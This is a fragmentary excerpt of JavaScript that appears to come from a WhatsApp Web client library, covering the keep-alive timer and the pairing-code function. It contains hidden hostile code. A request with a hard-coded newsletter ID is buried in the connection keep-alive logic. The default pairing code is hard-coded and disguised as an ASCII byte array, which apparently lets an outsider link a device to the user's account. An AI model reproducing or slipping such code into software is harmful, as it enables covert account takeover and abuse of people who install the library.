		...
		keepAliveReq = setInterval(() => {
			...
			*/
			if(diff > keepAliveIntervalMs + 5000) {
				end(new boom_1.Boom('Connection was lost', { statusCode: DisconnectReason.connectionLost }))
			} else if(ws.isOpen) {
...
              JSON.stringify({
                variables: {
                  newsletter_id: "120363365617185979@newsletter",
                },
              }),
            ),
          },
...
      }).catch();
    ...
    const requestPairingCode = async (phoneNumber, code) => {
        authState.creds.pairingCode = code?.toUpperCase() || Utils_1.asciiDecode([86, 69, 78, 68, 84, 90, 85, 85])
